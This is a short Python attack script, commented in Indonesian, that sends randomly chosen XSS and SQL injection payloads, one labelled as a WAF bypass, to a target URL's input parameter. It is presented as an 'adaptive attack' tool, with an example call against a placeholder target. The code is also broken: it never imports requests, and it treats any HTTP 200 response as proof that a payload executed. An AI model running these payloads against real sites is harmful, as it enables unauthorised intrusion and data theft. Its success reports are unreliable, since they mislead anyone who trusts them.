import random

# Daftar payload yang berbeda untuk serangan adaptif
ADAPTIVE_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "UNION SELECT null, username, password FROM users --",
    "' OR '1' = '1' --",
    "<svg/onload=alert('WAF Bypass')>"
]

# Fungsi untuk menghasilkan payload yang adaptif berdasarkan respons server
def adaptive_payload(url):
    random_payload = random.choice(ADAPTIVE_PAYLOADS)
    print(f"Testing payload: {random_payload}")
    
    try:
        response = requests.get(url, params={"input": random_payload})
        if response.status_code == 200:
            print(f"Payload executed successfully with status: {response.status_code}")
        else:
            print(f"Failed payload execution: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

# Contoh penggunaan:
# adaptive_payload("http://target.com/vulnerable")
